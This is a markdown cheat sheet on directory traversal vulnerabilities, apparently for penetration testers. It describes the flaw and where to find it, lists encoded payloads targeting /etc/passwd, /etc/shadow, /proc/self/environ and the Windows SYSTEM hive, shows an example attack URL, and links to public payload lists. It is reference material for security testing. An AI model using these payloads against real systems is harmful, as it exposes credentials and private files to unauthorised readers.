## Directory Traversal

| **Aspect**                   | **Details**                                                                                                                                          |
|------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Description**              | Directory Traversal is a web application vulnerability that allows an attacker to access files and directories stored outside the intended web root. |
| **Conditions to be Vulnerable** | - Application accepts user input for file paths without proper validation or sanitization.  <br> - User input is used directly in file system operations.  <br> - Lack of security controls to restrict access to sensitive directories. |
| **Where to Find**            | - File upload functionality with user-defined paths.  <br> - Applications using `include` or `require` statements in PHP.  <br> - Download links accepting user-defined parameters. |
| **Common Payloads**          | - `../../etc/passwd`  <br> - `..%2f..%2f..%2f..%2fetc%2fpasswd`  <br> - `..\\..\\..\\..\\Windows\\System32\\config\\SYSTEM`  <br> - `..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2fmysql.sock`  <br> - `..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd`  <br> - `../../../../../../../../etc/shadow`  <br> - `..%2f..%2f..%2f..%2fhome%2fuser%2fsecret.txt`  <br> - `..%2f..%2f..%2f..%2fboot.ini`  <br> - `..%2f..%2f..%2f..%2fproc%2fself%2fenviron` |
| **Example**                  | URL: `http://example.com/download.php?file=reports/report1.pdf`  <br> Payload: `http://example.com/download.php?file=../../../../etc/passwd` <br> If unvalidated, it may expose sensitive file contents. |

---

## Dedicated Directory Traversal Vulnerability Payloads:

| **Credit**                       | **URL**                                                                                                                    |
|----------------------------------|--------------------------------------------------------------------------------------------------------------------------|
| Swisskyrepo - PayloadsAllTheThings | [Directory Traversal Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt) |
| InfoSecWarrior                   | [Offensive Payloads](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Directory-Traversal-Payloads.txt)   |
| Swisskyrepo - PayloadsAllTheThings | [Directory Traversal README](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md) |
| Omurugur                         | [Path Traversal Payload List](https://github.com/omurugur/Path_Travelsal_Payload_List)        
